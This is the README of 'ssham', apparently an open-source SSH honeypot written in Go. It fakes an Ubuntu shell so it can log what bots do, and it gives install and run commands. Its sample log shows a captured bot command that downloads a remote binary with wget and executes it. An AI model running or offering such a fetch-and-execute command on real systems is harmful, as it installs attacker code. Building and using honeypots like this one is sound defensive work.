# ssham 🍯

A fake SSH server that catches bots.

Anyone can log in with any password or key. They get a shell that looks like a real
Ubuntu server, but nothing is real: every command is faked, files live in memory, and
nothing ever runs on your machine.

Meanwhile, ssham writes down everything they do.

## Run

```sh
go install github.com/antonmedv/ssham@latest
ssham -log ssham.jsonl
```

Try it:

```sh
ssh -p 2222 root@localhost
```

## What you see

```json
{"msg":"auth","user":"root","password":"123456"}
{"msg":"input","line":"cd /tmp; wget http://1.2.3.4/bot; chmod +x bot; ./bot"}
{"msg":"download","url":"http://1.2.3.4/bot"}
```

The bot sees `Segmentation fault`. You see the bot's URL.

## Catch real bots

Run it on port 22 with Docker: [DEPLOY.md](DEPLOY.md).

## Contributing

Adding a fake command is one small Go file. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

[MIT](LICENSE)
